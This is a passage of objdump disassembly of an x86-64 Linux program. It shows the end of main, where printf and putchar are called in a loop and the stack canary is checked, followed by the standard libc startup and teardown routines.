 cd5:	89 c2                	mov    %eax,%edx
 cd7:	48 8d 3d 77 01 00 00 	lea    0x177(%rip),%rdi        # e55 <_IO_stdin_used+0x85>
 cde:	b8 00 00 00 00       	mov    $0x0,%eax
 ce3:	e8 58 f9 ff ff       	callq  640 <printf@plt>
 ce8:	8b 45 f0             	mov    -0x10(%rbp),%eax
 ceb:	85 c0                	test   %eax,%eax
 ced:	7e 1d                	jle    d0c <main+0x1ac>
 cef:	8b 55 f0             	mov    -0x10(%rbp),%edx
 cf2:	0f b6 45 f7          	movzbl -0x9(%rbp),%eax
 cf6:	0f b6 c0             	movzbl %al,%eax
 cf9:	89 c6                	mov    %eax,%esi
 cfb:	48 8d 3d 6e 01 00 00 	lea    0x16e(%rip),%rdi        # e70 <_IO_stdin_used+0xa0>
 d02:	b8 00 00 00 00       	mov    $0x0,%eax
 d07:	e8 34 f9 ff ff       	callq  640 <printf@plt>
 d0c:	bf 0a 00 00 00       	mov    $0xa,%edi
 d11:	e8 0a f9 ff ff       	callq  620 <putchar@plt>
 d16:	8b 45 d8             	mov    -0x28(%rbp),%eax
 d19:	83 e8 01             	sub    $0x1,%eax
 d1c:	89 45 d8             	mov    %eax,-0x28(%rbp)
 d1f:	8b 45 d8             	mov    -0x28(%rbp),%eax
 d22:	85 c0                	test   %eax,%eax
 d24:	0f 89 1a ff ff ff    	jns    c44 <main+0xe4>
 d2a:	b8 00 00 00 00       	mov    $0x0,%eax
 d2f:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
 d33:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
 d3a:	00 00 
 d3c:	74 05                	je     d43 <main+0x1e3>
 d3e:	e8 ed f8 ff ff       	callq  630 <__stack_chk_fail@plt>
 d43:	c9                   	leaveq 
 d44:	c3                   	retq   
 d45:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 d4c:	00 00 00 
 d4f:	90                   	nop

0000000000000d50 <__libc_csu_init>:
 d50:	41 57                	push   %r15
 d52:	41 56                	push   %r14
 d54:	49 89 d7             	mov    %rdx,%r15
 d57:	41 55                	push   %r13
 d59:	41 54                	push   %r12
 d5b:	4c 8d 25 3e 10 20 00 	lea    0x20103e(%rip),%r12        # 201da0 <__frame_dummy_init_array_entry>
 d62:	55                   	push   %rbp
 d63:	48 8d 2d 3e 10 20 00 	lea    0x20103e(%rip),%rbp        # 201da8 <__init_array_end>
 d6a:	53                   	push   %rbx
 d6b:	41 89 fd             	mov    %edi,%r13d
 d6e:	49 89 f6             	mov    %rsi,%r14
 d71:	4c 29 e5             	sub    %r12,%rbp
 d74:	48 83 ec 08          	sub    $0x8,%rsp
 d78:	48 c1 fd 03          	sar    $0x3,%rbp
 d7c:	e8 77 f8 ff ff       	callq  5f8 <_init>
 d81:	48 85 ed             	test   %rbp,%rbp
 d84:	74 20                	je     da6 <__libc_csu_init+0x56>
 d86:	31 db                	xor    %ebx,%ebx
 d88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 d8f:	00 
 d90:	4c 89 fa             	mov    %r15,%rdx
 d93:	4c 89 f6             	mov    %r14,%rsi
 d96:	44 89 ef             	mov    %r13d,%edi
 d99:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 d9d:	48 83 c3 01          	add    $0x1,%rbx
 da1:	48 39 dd             	cmp    %rbx,%rbp
 da4:	75 ea                	jne    d90 <__libc_csu_init+0x40>
 da6:	48 83 c4 08          	add    $0x8,%rsp
 daa:	5b                   	pop    %rbx
 dab:	5d                   	pop    %rbp
 dac:	41 5c                	pop    %r12
 dae:	41 5d                	pop    %r13
 db0:	41 5e                	pop    %r14
 db2:	41 5f                	pop    %r15
 db4:	c3                   	retq   
 db5:	90                   	nop
 db6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 dbd:	00 00 00 

0000000000000dc0 <__libc_csu_fini>:
 dc0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000dc4 <_fini>:
 dc4:	48 83 ec 08          	sub    $0x8,%rsp
 dc8:	48 83 c4 08          	add    $0x8,%rsp
 dcc:	c3                   	retq   
